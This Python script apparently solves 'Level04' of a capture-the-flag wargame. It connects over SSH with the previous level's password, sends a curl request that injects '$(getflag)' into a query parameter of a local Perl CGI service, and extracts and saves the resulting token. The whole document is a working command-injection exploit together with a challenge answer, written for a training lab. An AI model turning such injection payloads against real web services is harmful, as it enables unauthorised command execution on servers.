"""Level04 - Perl CGI Command Injection via SSH"""

import sys, re
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag

def exploit(host, port, ssh_port, pwd):
	print(f"[*] Connecting to level04@{host}:{ssh_port}")
	code, out, err = ssh_cmd(host, ssh_port, "level04", pwd, "id")
	if code != 0:
		print("[!] SSH failed")
		return False, ""
	print(f"[+] SSH OK: {out.strip()}\n")
	cmd = 'curl -s "http://localhost:4747/?x=\\$(getflag)"'
	print(f"[*] Executing: {cmd}")
	code, out, err = ssh_cmd(host, ssh_port, "level04", pwd, cmd)
	if code == 0:
		match = re.search(r"token\s*:\s*([a-zA-Z0-9]+)", out)
		if match:
			print(f"[+] Success!\n    Token: {match.group(1)}")
			return True, match.group(1)
	print(f"[!] Failed. Code: {code}")
	return False, ""

def main():
	print("Level04 Perl CGI Command Injection\n")
	pwd = read_flag(3)
	success, token = exploit("localhost", 4747, 4242, pwd)
	if success:
		save_flag(4, token)
		print(f"\n[SUMMARY]\n  Vulnerability: Perl backtick injection\n  Attack: Injected $(getflag) in URL\n  Result: Executed as flag04\n[ANSWER]\n  Level04 Token: {token}")
	else:
		print("[!] Exploit failed")
		sys.exit(1)

if __name__ == "__main__":
	main()
